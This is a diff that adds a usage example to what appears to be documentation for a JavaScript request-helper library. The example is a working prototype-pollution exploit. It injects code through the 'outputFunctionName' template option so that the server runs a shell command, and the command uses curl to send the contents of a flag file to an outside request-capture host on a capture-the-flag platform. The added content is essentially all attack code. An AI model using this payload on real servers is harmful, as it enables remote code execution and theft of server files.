@@ -45,3 +45,22 @@ console.log(res.formData);
 // in fact, you don't need to close vm. it will close automatically
 // await ph.closeVM();
 ```
+
+```js
+import { RequestHelper, QueryBuilder } from "webhtools";
+
+const client = new RequestHelper("http://localhost:3000");
+
+const data = {
+  key: "__proto__",
+  value: {
+    "settings": {
+      "view options": {
+        "outputFunctionName": "x;process.mainModule.require('child_process').execSync(\"curl --data $(cat ./flag) 'https://cghilzr.request.dreamhack.games'\");s"
+      }
+    }
+  }
+}
+await client.get('/?'+new QueryBuilder(data));
+console.log(new QueryBuilder(data))
+```
